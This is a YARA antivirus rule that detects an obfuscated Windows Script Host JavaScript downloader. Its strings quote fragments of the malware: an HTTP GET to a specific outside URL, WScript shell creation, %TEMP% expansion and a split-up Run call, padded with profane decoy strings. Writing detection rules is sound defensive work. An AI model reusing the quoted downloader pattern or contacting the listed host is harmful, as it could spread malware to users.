rule sig_20160428_602a3472ea1fc4e29b6264e206f6f3ba {
  meta:
    description = "datamaliciousorder - file 20160428_602a3472ea1fc4e29b6264e206f6f3ba.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "ff139a09fd689c11d4bd13764a52dbc2e750d464cafe7548e4f991f827d04f60"

  strings:
    $s1  = "QdoAmaAedPllHxsCrxVah[IfuCxoCzyMgaZegHmlWan](\"G\" + \"ET\", \"http://laichaupc.com/m8eusk\", false);" fullword ascii
    $s2  = "function NvwPbbBpmPbwFrtBfxRzg(QshPzpUxuTxsWrtXtwIzb){MvbFagWwvOcxZyyKweCru[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s3  = "function NvwPbbBpmPbwFrtBfxRzg(QshPzpUxuTxsWrtXtwIzb){MvbFagWwvOcxZyyKweCru[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s4  = "function YgmFogJwwPshCgpQfeSoj() {return MvbFagWwvOcxZyyKweCru[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s5  = "var MvbFagWwvOcxZyyKweCru = function JkfUhqRwyBliXueMimAfx() {return YngRekKqjFhnTtjJwsKyg[MewJfhPxiDpqBcbVshNaa](\"WScript\"+\"" ascii
    $s6  = "var YngRekKqjFhnTtjJwsKyg = this[\"WScript\"];" fullword ascii
    $s7  = "var MvbFagWwvOcxZyyKweCru = function JkfUhqRwyBliXueMimAfx() {return YngRekKqjFhnTtjJwsKyg[MewJfhPxiDpqBcbVshNaa](\"WScript\"+\"" ascii
    $s8  = "function YgmFogJwwPshCgpQfeSoj() {return MvbFagWwvOcxZyyKweCru[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s9  = "function FviIvkVunWubTfwIfcOzp(NshNwmSbuCazEgeWawNmz, LxxWpiEsrDkcXdpElpUcd){JqjDatQmhWjvUvsTfkTaf = JqjDatQmhWjvUvsTfkTaf * 1; " ascii
    $s10 = "return NshNwmSbuCazEgeWawNmz - LxxWpiEsrDkcXdpElpUcd;};" fullword ascii
    $s11 = "function BaxHmgUydAvmKryTmiLvc(){return UhrMlkAgrXehBgeVwbUnf + \"\";};" fullword ascii
    $s12 = "if (QdoAmaAedPllHxsCrxVah[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s13 = "var LvkRrtCesTgbFjxRwlYnq = false;" fullword ascii
    $s14 = "var EvgEeiLxiLumHkpKcbUze = new this[\"D\"+\"ate\"]();" fullword ascii
    $s15 = "XtxKxrUjbGwhLvyHwyUaf = true; " fullword ascii
    $s16 = "FofCvtAmxWulKmeEsgYnh = true;" fullword ascii
    $s17 = "function JomFiwRkdAfnBwoQijBma(YmeVchElaDjvZlxLjjPkq) {var DcoSeyQejCsjIkqAbgHyy = (1, 2, 3, 4, 5, YmeVchElaDjvZlxLjjPkq); retur" ascii
    $s18 = "var FofCvtAmxWulKmeEsgYnh = false;" fullword ascii
    $s19 = "return FviIvkVunWubTfwIfcOzp(1 == 1 ? XcyDqiLhcQhiCtiPuyPhl : 0, 1 == 1 ? RogZcvRzgFofQwmBhzRfx : 0);" fullword ascii
    $s20 = "function YqoMblTzlNojZwfEhoWiu(){return 23;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}